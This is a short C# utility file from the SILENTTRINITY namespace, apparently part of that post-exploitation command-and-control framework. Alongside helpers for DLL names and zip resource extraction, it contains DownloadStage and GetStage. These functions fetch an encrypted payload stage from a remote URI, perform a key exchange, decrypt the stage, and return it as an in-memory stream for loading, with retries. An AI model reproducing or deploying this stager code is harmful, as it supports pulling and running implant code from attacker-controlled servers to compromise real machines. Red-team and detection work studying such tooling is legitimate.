using System;
using System.IO;
using System.IO.Compression;

namespace SILENTTRINITY.Utilities
{
    public static class Internals
    {
        public static string GetDLLName(string name)
        {
            string dllName = name + ".dll";

            if (name.IndexOf(',') > 0)
            {
                dllName = name.Substring(0, name.IndexOf(',')) + ".dll";
            }

            return dllName;
        }

        public static byte[] GetResourceInZip(ZipStorer zip, string resourceName)
        {
            foreach (var entry in zip.ReadCentralDir())
            {
                if (entry.FilenameInZip == resourceName)
                {
                    var resdata = new byte[entry.FileSize];
                    zip.ExtractFile(entry, out resdata);
                    return resdata;
                }
            }
            return default;
        }

        public static MemoryStream DownloadStage(Uri URL, int sleep = 10, int retries = 5)
        {
            return Retry.Do(() => GetStage(URL), TimeSpan.FromSeconds(sleep), retries);
        }

        static MemoryStream GetStage(Uri uri)
        {
            try
            {
                var key = Crypto.Base.KeyExchange(uri);
                var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
                return new MemoryStream(stage);
            } catch (Exception ex) {
                throw ex;
            }
        }
    }
}
